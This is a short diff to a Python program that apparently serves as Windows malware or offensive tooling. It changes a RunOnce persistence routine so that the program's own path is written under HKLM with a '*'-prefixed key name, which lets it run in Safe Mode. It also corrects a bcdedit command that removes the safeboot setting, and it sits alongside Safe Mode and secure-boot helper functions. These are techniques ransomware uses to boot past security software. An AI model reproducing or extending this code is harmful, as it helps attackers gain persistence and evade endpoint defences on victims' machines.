@@ -36,10 +36,9 @@ def is_secure_boot() -> bool:
 
 
 def addRun_once():
-    reg_key = random_string(is_random=True)
+    reg_key = "*" + random_string(is_random=True)
     reg_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' # this does not get executed
-    bat_dropper = f'start /d "{os.path.dirname(get_current_file_path())}" {os.path.basename(get_current_file_path())}'
-    setRegistryKey(key_name=reg_key,value=f"*{bat_dropper}",registry_path=reg_path)
+    setRegistryKey(key_name=reg_key,value=f"{get_current_file_path()}",registry_path=reg_path,HKLM=True)
     return True
 
 
@@ -48,5 +47,5 @@ def enable_safemode():
     return
 
 def disable_safemod():
-    run_detached_process("bcdedit / deletevalue {default} safeboot")
+    run_detached_process("bcdedit /deletevalue {default} safeboot")
     return
